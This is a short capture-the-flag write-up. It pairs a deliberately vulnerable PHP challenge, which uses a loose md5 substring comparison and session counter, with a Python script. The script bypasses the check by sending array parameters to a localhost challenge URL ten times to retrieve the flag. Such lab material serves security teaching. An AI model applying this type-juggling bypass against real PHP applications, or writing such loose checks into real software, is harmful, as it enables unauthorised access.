# Challenge 
```php 
<?php 
error_reporting(0);
session_start();
require ('./flag.php');
if (!isset($_SESSION['nums'])) {
    $_SESSION['nums'] = 0;
    $_SESSION['time'] = time();
    $_SESSION['whoami'] = 'ea';
}
if ($_SESSION['time'] + 120 < time()) {
    session_destroy();
}
$value = $_REQUEST['value'];
$str_rand = range('a', 'z');
$str_rands = $str_rand[mt_rand(0, 25) ] . $str_rand[mt_rand(0, 25) ];
if ($_SESSION['whoami'] == ($value[0] . $value[1]) && substr(md5($value) , 5, 4) == 0) {
    $_SESSION['nums']++;
    $_SESSION['whoami'] = $str_rands;
    echo $str_rands;
}
if ($_SESSION['nums'] >= 10) {
    echo $flag;
}
show_source(__FILE__);
?>

```

# Solution 

```python
#encoding:utf-8

__author__ = 'zhengjim'

import requests

aa = requests.session()
code = aa.get('http://localhost/php_challenge/28.php?value[0]=e&value[1]=a').text
# print code
cc = code[:2]
for i in xrange(10):
    url = 'http://localhost/php_challenge/28.php?value[0]={}&value[1]={}'.format(cc[0], cc[1])
    flag = aa.get(url=url).text
    cc = flag[:2]
print flag
```

# Refference
+ [百度杯CTF二月Web专场](http://www.au1ge.xyz/2017/02/23/%E7%99%BE%E5%BA%A6%E6%9D%AFctf%E4%BA%8C%E6%9C%88web%E4%B8%93%E5%9C%BAwriteup/)

